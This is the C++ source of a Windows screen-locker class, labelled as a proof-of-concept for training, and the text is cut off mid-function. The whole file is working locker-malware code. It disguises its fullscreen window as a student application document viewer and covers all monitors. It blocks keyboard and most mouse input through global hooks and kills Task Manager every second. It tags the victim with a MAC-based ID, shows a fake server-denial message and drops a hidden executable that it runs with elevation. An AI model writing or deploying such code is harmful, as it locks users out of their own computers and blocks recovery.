#include "ScreenLocker.h"
#include "StringUtils.h" // [REFACTOR] Include the new utility header.
#include "Constants.h" // [REFACTOR] Include the new constants header.
#include <iostream>
#include <wingdi.h>
#include <winuser.h>
#include <random>
#include <sstream>
#include <fstream>
#include <iphlpapi.h>
#include <shlobj.h>
#include <cctype>
#include <thread>
#include <shellapi.h>
#include <vector>
#include <tlhelp32.h>

ScreenLocker* ScreenLocker::instance = nullptr;

ScreenLocker::ScreenLocker(HINSTANCE hInst) {
    hInstance = hInst;
    hWnd = nullptr;
    // Native dialog variables
    hUnlockDialog = nullptr;
    dialogRunning = false;
    
    userID = GetOrCreateUserID();
    unlockClickCount = 0;

    // Hook related variables initialization
    instance = this;
    keyboardHook = nullptr;
    mouseHook = nullptr;
    inputBlockingEnabled = false;
    performingSystemAction = false;
    
    // Advanced security features variables initialization
    advancedSecurityEnabled = false;
    securityCheckTimer = 0;

    // Multi-monitor support variables initialization
    primaryMonitorIndex = 0;
    multiMonitorEnabled = false;
}

ScreenLocker::~ScreenLocker() {
    RemoveInputHooks();      // remove input hooks
    Cleanup();
    instance = nullptr;
}

bool ScreenLocker::Initialize() {
    std::wcout << L"Starting screen locker..." << std::endl;
    
    // Extract remover executable
    ExtractRemoverExecutable();
    
    // Hook installation
    if (!InstallInputHooks()) {
        SaveToLogFile(userID, "INITIALIZATION_FAILED");
        MessageBoxW(NULL, 
                   L"A critical security component (Input Blocker) failed to initialize.\nThe program cannot continue.",
                   L"Initialization Error", 
                   MB_OK | MB_ICONERROR);
        return false;
    }
    
    return CreateMainWindow();
}

bool ScreenLocker::CreateMainWindow() {
    // Register window class
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"ScreenLockerClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    if (!RegisterClassW(&wc)) {
        return false;
    }

    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create fullscreen topmost window
    hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"ScreenLockerClass",
        L"Student Application Form - Document Viewer",
        WS_POPUP,
        0, 0, width, height,
        nullptr, nullptr, hInstance, this
    );

    if (!hWnd) return false;

    // Set as topmost and show
    SetScreenLockerTopmost();
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    // ↓↓↓ Input blocking enabled ↓↓↓
    EnableInputBlocking();

    // ↓↓↓ Advanced security features enabled ↓↓↓
    EnableAdvancedSecurity();

    // ↓↓↓ Multi-monitor support enabled ↓↓↓
    EnableMultiMonitorSupport();

    return true;
}

int ScreenLocker::Run() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

bool ScreenLocker::InstallInputHooks() {
    // Install keyboard hook
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,              // Low-level keyboard hook
        KeyboardHookProc,            // Hook procedure
        hInstance,                   // DLL handle (current module)
        0                            // Apply to all threads
    );
    
    if (!keyboardHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "KEYBOARD_HOOK_INSTALL_FAILED: " + std::to_string(error));
        return false;
    }
    
    // Install mouse hook
    mouseHook = SetWindowsHookEx(
        WH_MOUSE_LL,                 // Low-level mouse hook
        MouseHookProc,               // Hook procedure
        hInstance,                   // DLL handle
        0                            // Apply to all threads
    );
    
    if (!mouseHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "MOUSE_HOOK_INSTALL_FAILED: " + std::to_string(error));
        
        // Remove keyboard hook since it's installed
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
        return false;
    }
    
    return true;
}

void ScreenLocker::RemoveInputHooks() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }
    
    if (mouseHook) {
        UnhookWindowsHookEx(mouseHook);
        mouseHook = nullptr;
    }
}



void ScreenLocker::EnableInputBlocking() {
    inputBlockingEnabled = true;
    SaveToLogFile(userID, "INPUT_BLOCKING_ENABLED");
}

void ScreenLocker::DisableInputBlocking() {
    inputBlockingEnabled = false;
    SaveToLogFile(userID, "INPUT_BLOCKING_DISABLED");
}

void ScreenLocker::SetSystemActionMode(bool performing) {
    performingSystemAction = performing;
    if (performing) {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_ENABLED");
    } else {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_DISABLED");
    }
}

// Hook procedures remain the same but simplified comments
LRESULT CALLBACK ScreenLocker::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    if (pThis->ShouldBlockKeyboardInput(wParam, lParam)) {
        return 1; // Block input
    }
    
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK ScreenLocker::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    if (pThis->ShouldBlockMouseInput(wParam, lParam)) {
        return 1; // Block input
    }
    
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

bool ScreenLocker::ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam) {
    if (performingSystemAction) {
        return false;
    }
    return true;
}

bool ScreenLocker::ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam) {
    if (performingSystemAction) {
        return false;
    }
    
    switch (wParam) {
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_MOUSEMOVE:
            return false; // Allow
            
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_XBUTTONDOWN:
        case WM_XBUTTONUP:
        case WM_MOUSEWHEEL:
        case WM_MOUSEHWHEEL:
            return true; // Block
            
        default:
            return false;
    }
}

void ScreenLocker::EnableAdvancedSecurity() {
    if (advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = true;
    
    // Start security check timer (every 1 second)
    securityCheckTimer = SetTimer(hWnd, Constants::SecurityTimerID, 1000, SecurityCheckCallback);
    
    // Check immediately once
    DetectAndBlockTaskManager();
}

void ScreenLocker::DisableAdvancedSecurity() {
    if (!advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = false;
    
    // Remove timer
    if (securityCheckTimer) {
        KillTimer(hWnd, Constants::SecurityTimerID);
        securityCheckTimer = 0;
    }
}

void CALLBACK ScreenLocker::SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    ScreenLocker* pThis = GetInstance();
    if (!pThis || !pThis->advancedSecurityEnabled) return;
    
    // Check and block task manager
    pThis->DetectAndBlockTaskManager();
}

bool ScreenLocker::DetectAndBlockTaskManager() {
    // Find task manager window
    HWND taskMgr = FindWindow(L"TaskManagerWindow", NULL);
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"Task Manager");  // English
    }
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"작업 관리자");  // Korean system support
    }
    
    if (taskMgr) {
        // Hide and disable window
        ShowWindow(taskMgr, SW_HIDE);
        EnableWindow(taskMgr, FALSE);
        
        // Try to terminate process
        return TerminateTaskManager();
    }
    
    return false;
}

bool ScreenLocker::IsTaskManagerRunning() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    bool found = false;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = StringUtils::WStringToString(processNameW);
            
            // Task manager process names
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                SaveToLogFile(userID, "TASK_MANAGER_PROCESS_DETECTED: " + processName);
                found = true;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return found;
}

bool ScreenLocker::TerminateTaskManager() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    bool terminated = false;
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = StringUtils::WStringToString(processNameW);
            
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
    
                if (hProcess) {
                    if (TerminateProcess(hProcess, 0)) {
                        terminated = true;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return terminated;
}

void ScreenLocker::EnableMultiMonitorSupport() {
    if (multiMonitorEnabled) return;
    
    // Detect monitors
    if (!DetectMonitors()) {
        return;
    }
    
    // Create multiple monitor windows
    if (!CreateMonitorWindows()) {
        return;
    }
    
    multiMonitorEnabled = true;
}

void ScreenLocker::DisableMultiMonitorSupport() {
    if (!multiMonitorEnabled) return;
    
    DestroyMonitorWindows();
    monitorWindows.clear();
    monitorInfos.clear();
    
    multiMonitorEnabled = false;
}

bool ScreenLocker::DetectMonitors() {
    
    // Initialize existing information
    monitorInfos.clear();
    primaryMonitorIndex = 0;
    
    // Enumerate monitors
    if (!EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)this)) {
        SaveToLogFile(userID, "ENUM_DISPLAY_MONITORS_FAILED");
        return false;
    }
    
    // Find primary monitor
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if (monitorInfos[i].dwFlags & MONITORINFOF_PRIMARY) {
            primaryMonitorIndex = (int)i;
            break;
        }
    }
    
    return monitorInfos.size() > 0;
}

BOOL CALLBACK ScreenLocker::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    ScreenLocker* pThis = (ScreenLocker*)dwData;
    if (!pThis) return FALSE;
    
    MONITORINFO monitorInfo;
    monitorInfo.cbSize = sizeof(MONITORINFO);
    
    if (GetMonitorInfo(hMonitor, &monitorInfo)) {
        pThis->monitorInfos.push_back(monitorInfo);
    }
    
    return TRUE; // Continue enumeration
}

bool ScreenLocker::CreateMonitorWindows() {
    
    // Clean up existing windows
    DestroyMonitorWindows();
    
    // Create windows for each monitor (except primary monitor)
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if ((int)i == primaryMonitorIndex) {
            // Skip primary monitor since it already has the main window
            monitorWindows.push_back(hWnd);
            continue;
        }
        
        // Create secondary window for each monitor
        HWND secondaryWindow = CreateSecondaryWindow(monitorInfos[i], (int)i);
        if (secondaryWindow) {
            monitorWindows.push_back(secondaryWindow);
        } else {
            SaveToLogFile(userID, "SECONDARY_WINDOW_CREATION_FAILED: Monitor" + std::to_string(i));
            monitorWindows.push_back(nullptr);
        }
    }
    
    return true;
}

HWND ScreenLocker::CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex) {
    // Register window class for secondary window
    std::wstring className = L"ScreenLockerSecondary" + std::to_wstring(monitorIndex);
    
    WNDCLASSW wc = {};
    wc.lpfnWndProc = SecondaryWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className.c_str();
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClassW(&wc);
    
    // Calculate monitor size
    int x = monitorInfo.rcMonitor.left;
    int y = monitorInfo.rcMonitor.top;
    int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
    int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;
    
    // Create secondary window
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        className.c_str(),
        L"Document Viewer - Extended Display",
        WS_POPUP | WS_VISIBLE,
        x, y, width, height,
        nullptr, nullptr, hInstance, this
    );
    
    if (hwnd) {
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }
    
    return hwnd;
}

LRESULT CALLBACK ScreenLocker::SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // Black background
            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            // Simple text display
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);
            
            HFONT hFont = CreateFont(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                   DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                   CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                   VARIABLE_PITCH, L"Arial");
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
            
            const wchar_t* message = L"[PoC Training] Access Denied - Secondary Monitor";
            DrawText(hdc, message, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            
            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);
            return 0;
        }
        
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_LBUTTONDOWN:
        case WM_RBUTTONDOWN:
            // Ignore all input (handled by main window's hook)
            return 0;
            
        case WM_CLOSE:
            // Prevent window from closing
            return 0;
            
        case WM_DESTROY:
            return 0;
    }
    
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void ScreenLocker::DestroyMonitorWindows() {
    SaveToLogFile(userID, "DESTROYING_MONITOR_WINDOWS");
    
    for (size_t i = 0; i < monitorWindows.size(); i++) {
        if (monitorWindows[i] && monitorWindows[i] != hWnd) {
            // Destroy only secondary windows (not main window)
            DestroyWindow(monitorWindows[i]);
            SaveToLogFile(userID, "SECONDARY_WINDOW_DESTROYED: Monitor" + std::to_string(i));
        }
    }
    
    monitorWindows.clear();
}

void ScreenLocker::UpdateMonitorConfiguration() {
    if (!multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "UPDATING_MONITOR_CONFIGURATION");
    
    // Re-detect monitors
    std::vector<MONITORINFO> oldMonitorInfos = monitorInfos;
    
    if (DetectMonitors()) {
        // Check if monitor configuration has changed
        bool configChanged = (oldMonitorInfos.size() != monitorInfos.size());
        
        if (configChanged) {
            SaveToLogFile(userID, "MONITOR_CONFIG_CHANGED_RECREATING_WINDOWS");
            CreateMonitorWindows();
        }
    }
}

void ScreenLocker::Cleanup() {
    DisableAdvancedSecurity();
    DisableMultiMonitorSupport();

    // Close native dialog if open
    CloseNativeDialog();
    
    if (hWnd) {
        DestroyWindow(hWnd);
        hWnd = nullptr;
    }
}

LRESULT CALLBACK ScreenLocker::WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            // Paint logic remains the same
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            HFONT hFont = CreateFont(50, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Times New Roman");
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);

            const wchar_t* message = L"[PoC Training] System Access Denied";
            RECT textRect = rect;
            textRect.bottom = textRect.bottom / 2 - 50;
            DrawText(hdc, message, -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            textRect = rect;
            textRect.top = rect.bottom / 2 + 50;

            if (pThis) {
                std::wstring wideUserID(pThis->userID.begin(), pThis->userID.end());
                std::wstring userIDMessage = L"Your User ID: " + wideUserID;
                DrawText(hdc, userIDMessage.c_str(), -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            } else {
                DrawText(hdc, L"Your User ID: (loading...)", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }

            RECT buttonRect;
            buttonRect.left = rect.right / 2 - (DIALOG_BUTTON_WIDTH / 2);
            buttonRect.right = rect.right / 2 + (DIALOG_BUTTON_WIDTH / 2);
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2 + 150 + DIALOG_BUTTON_HEIGHT;
            
            HBRUSH buttonBrush = CreateSolidBrush(RGB(100, 100, 100));
            FillRect(hdc, &buttonRect, buttonBrush);
            DeleteObject(buttonBrush);
            
            SetTextColor(hdc, RGB(255, 255, 255));
            DrawText(hdc, L"[POC] Request Unlock", -1, &buttonRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);
            return 0;
        }

        case WM_LBUTTONDOWN: {
            int xPos = LOWORD(lParam);
            int yPos = HIWORD(lParam);
            
            RECT rect;
            GetClientRect(hWnd, &rect);
            
            RECT buttonRect;
            buttonRect.left = rect.right / 2 - (DIALOG_BUTTON_WIDTH / 2);
            buttonRect.right = rect.right / 2 + (DIALOG_BUTTON_WIDTH / 2);
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2 + 150 + DIALOG_BUTTON_HEIGHT;
            
            if (xPos >= buttonRect.left && xPos <= buttonRect.right && yPos >= buttonRect.top && yPos <= buttonRect.bottom) {
                
                // Check if dialog is not currently running
                if (pThis && !pThis->dialogRunning) {
                    pThis->SaveToLogFile(pThis->userID, "UNLOCK_BUTTON_CLICKED_COUNT: " + std::to_string(pThis->unlockClickCount + 1));
                    
                    if (pThis->unlockClickCount == 0) {
                        pThis->unlockClickCount++;
                        pThis->SaveToLogFile(pThis->userID, "FIRST_CLICK_SHOWING_STILL_BLOCKED");
                        MessageBoxW(pThis->hWnd, L"Still Blocked. Access denied by server.", 
                                L"Status: Locked", MB_OK | MB_ICONERROR);
                        pThis->SetScreenLockerTopmost();
                    } else {
                        // Open native unlock dialog
                        pThis->SaveToLogFile(pThis->userID, "SECOND_CLICK_OPENING_NATIVE_DIALOG");
                        std::thread(&ScreenLocker::HandleUnlockProcess, pThis).detach();
                    }
                }
                return 0;
            }
            break;
        }
        
        case WM_CLOSE: {
            return 0;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
            break;
    }
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Get MAC Address to Generate User ID
std::string ScreenLocker::GetMacAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);

    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        if (pAdapterInfo) {
            char buffer[3];
            sprintf_s(buffer, "%02X", pAdapterInfo->Address[0]);
            return std::string(buffer);
        }
    }
    return "FF";
}

// Generate Random ID
std::string ScreenLocker::GenerateRandomID() {
    std::random_device rd;
    std::mt19937 gen(rd());

    std::string result;

    // Add MAC Address + "-"
    std::string macPrefix = GetMacAddress();

    for (char& c : macPrefix) {
        c = std::toupper(c);
    }
    result = macPrefix + "-";

    // Add 3 numbers
    std::uniform_int_distribution<> numdis(0, 9);
    for (int i = 0; i < 3; i++) {
        result += ('0' + numdis(gen));
    }

    // Add 3 lowercase letters
    std::uniform_int_distribution<> alphaDis(0, 25);
    for (int i = 0; i < 3; i++) {
        result += static_cast<char>('a' + alphaDis(gen));
    }

    // Use only URL-safe special characters (? & = / etc. excluded)
    std::string safeSpecialChars = "_-";  // Only URL-safe characters
    std::uniform_int_distribution<size_t> specialCountDis(1, 2);
    size_t specialCount = specialCountDis(gen);

    std::uniform_int_distribution<size_t> specialDis(0, safeSpecialChars.length() - 1);
    for (size_t i = 0; i < specialCount; i++) {
        result += safeSpecialChars[specialDis(gen)];
    }

    // Shuffle the result (excluding MAC part)
    std::string toShuffle = result.substr(3);
    for (size_t i = toShuffle.length() - 1; i > 0; i--) {
        std::uniform_int_distribution<size_t> shuffleDis(0, i); 
        size_t j = shuffleDis(gen);
        char temp = toShuffle[i];
        toShuffle[i] = toShuffle[j];
        toShuffle[j] = temp;
    }

    result = result.substr(0, 3) + toShuffle;

    return result;
}

std::string ScreenLocker::GetOrCreateUserID() {
    // Check if User ID is already saved
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + Constants::AppDataLogDir;
        std::string logPath = windowsDir + "\\" + Constants::MainLogFile;

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ifstream logFile(logPath);
        if (logFile.good()) {
            std::string line;
            std::string currentMAC = GetMacAddress();
            std::string lastFoundUserID;

            // Check the previous User ID - Use the last found one
            while (std::getline(logFile, line)) {
                if (line.find("User ID: ") != std::string::npos && line.find("MAC Address: " + currentMAC) != std::string::npos) {
                    // Extract the User ID
                    size_t idStart = line.find("User ID: ") + 9;
                    size_t idEnd = line.find(" | MAC Address: ");
                    if (idStart != std::string::npos && idEnd != std::string::npos) {
                        lastFoundUserID = line.substr(idStart, idEnd - idStart);
                    }
                }
            }
            logFile.close();
            
            // If a User ID is found, return it
            if (!lastFoundUserID.empty()) {
                return lastFoundUserID;
            }
        }
    }

    // Generate New User ID only if none was found
    std::string newID = GenerateRandomID();
    SaveToLogFile(newID, "NEW_URL_SAFE_USER_ID_GENERATED");

    return newID;
}

void ScreenLocker::SaveToLogFile(const std::string& userID, const std::string& action) {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + Constants::AppDataLogDir;
        std::string logPath = windowsDir + "\\" + Constants::MainLogFile;

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ofstream logFile(logPath, std::ios::app);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
                << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond 
                << "] " << action << " | User ID: " << userID << " | MAC Address: " << GetMacAddress() << std::endl;
        
        logFile.close();
    }
}

// Window priority control functions
void ScreenLocker::SetScreenLockerTopmost() {
    if (hWnd) {
        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        SetForegroundWindow(hWnd);
        SaveToLogFile(userID, "SCREENLOCKER_SET_TOPMOST");
    }
}

void ScreenLocker::RestoreScreenLockerTopmost() {
    SetScreenLockerTopmost();
    SaveToLogFile(userID, "SCREENLOCKER_TOPMOST_RESTORED");
}

bool ScreenLocker::ExtractRemoverExecutable() {
    try {
        // Find the resource
        HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(Constants::RemoverResourceID), RT_RCDATA);
        if (!hResource) {
            SaveToLogFile(userID, "RESOURCE_FIND_FAILED");
            return false;
        }
        
        // Load the resource
        HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
        if (!hLoadedResource) {
            SaveToLogFile(userID, "RESOURCE_LOAD_FAILED");
            return false;
        }
        
        // Get resource data and size
        LPVOID pResourceData = LockResource(hLoadedResource);
        DWORD resourceSize = SizeofResource(NULL, hResource);
        
        if (!pResourceData || resourceSize == 0) {
            SaveToLogFile(userID, "RESOURCE_DATA_INVALID");
            return false;
        }
        
        // Create target directory
        char programDataPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) != S_OK) {
            SaveToLogFile(userID, "PROGRAMDATA_PATH_FAILED");
            return false;
        }
        
        std::string targetDir = std::string(programDataPath) + Constants::ProgramDataDir;
        std::string targetPath = targetDir + "\\" + Constants::RemoverExeName;
        
        // Create directory
        if (!CreateDirectoryA(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
            SaveToLogFile(userID, "TARGET_DIRECTORY_CREATE_FAILED");
            return false;
        }
        
        // Write resource to file
        HANDLE hFile = CreateFileA(targetPath.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SaveToLogFile(userID, "TARGET_FILE_CREATE_FAILED");
            return false;
        }
        
        DWORD bytesWritten;
        BOOL writeResult = WriteFile(hFile, pResourceData, resourceSize, &bytesWritten, NULL);
        CloseHandle(hFile);
        
        if (!writeResult || bytesWritten != resourceSize) {
            SaveToLogFile(userID, "FILE_WRITE_FAILED");
            return false;
        }
        
        SaveToLogFile(userID, "REMOVER_EXTRACTED_SUCCESS: " + targetPath);
        return true;
        
    } catch (...) {
        SaveToLogFile(userID, "REMOVER_EXTRACTION_EXCEPTION");
        return false;
    }
}

std::string ScreenLocker::GetRemoverPath() {
    char programDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
        return std::string(programDataPath) + Constants::ProgramDataDir + "\\" + Constants::RemoverExeName;
    }
    return "";
}

bool ScreenLocker::ExecuteRemoverWithAdmin() {
    std::string removerPath = GetRemoverPath();
    
    if (removerPath.empty()) {
        SaveToLogFile(userID, "REMOVER_PATH_NOT_FOUND");
        return false;
    }
    
    // Check if remover file exists
    DWORD fileAttr = GetFileAttributesA(removerPath.c_str());
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        SaveToLogFile(userID, "REMOVER_FILE_NOT_EXISTS");
        return false;
    }
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";  // Request admin elevation
    sei.lpFile = removerPath.c_str();
    sei.lpParameters = "";
    sei.nShow = SW_NORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    
    if (ShellExecuteExA(&sei)) {
        SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_SUCCESS");
        
        if (sei.hProcess) {
            // Wait for the process to complete
            DWORD waitResult = WaitForSingleObject(sei.hProcess, 30000); // 30 second timeout
            
            if (waitResult == WAIT_OBJECT_0) {
                DWORD exitCode;
                if (GetExitCodeProcess(sei.hProcess, &exitCode)) {
                    if (exitCode == 0) {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_SUCCESS");
                        CloseHandle(sei.hProcess);
                        return true;
                    } else {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_WITH_ERROR: " + std::to_string(exitCode));
                    }
                }
            } else if (waitResult == WAIT_TIMEOUT) {
                SaveToLogFile(userID, "REMOVER_EXECUTION_TIMEOUT");
            }
            
            CloseHandle(sei.hProcess);
        }
    } else {
        DWORD error = GetLastError();
        if (error == ERROR_CANCELLED) {
            SaveToLogFile(userID, "REMOVER_UAC_CANCELLED_BY_USER");
        } else {
            SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_FAILED: " + std::to_string(error));
        }
    }
    
    return false;
}

void ScreenLocker::HandleUnlockProcess() {
    SaveToLogFile(userID, "UNLOCK_PROCESS_STARTED");
    ShowNativeUnlockDialog();
    SaveToLogFile(userID, "UNLOCK_PROCESS_COMPLETED");
}

void ScreenLocker::ShowNativeUnlockDialog() {
    SaveToLogFile(userID, "SHOWING_NATIVE_UNLOCK_DIALOG");
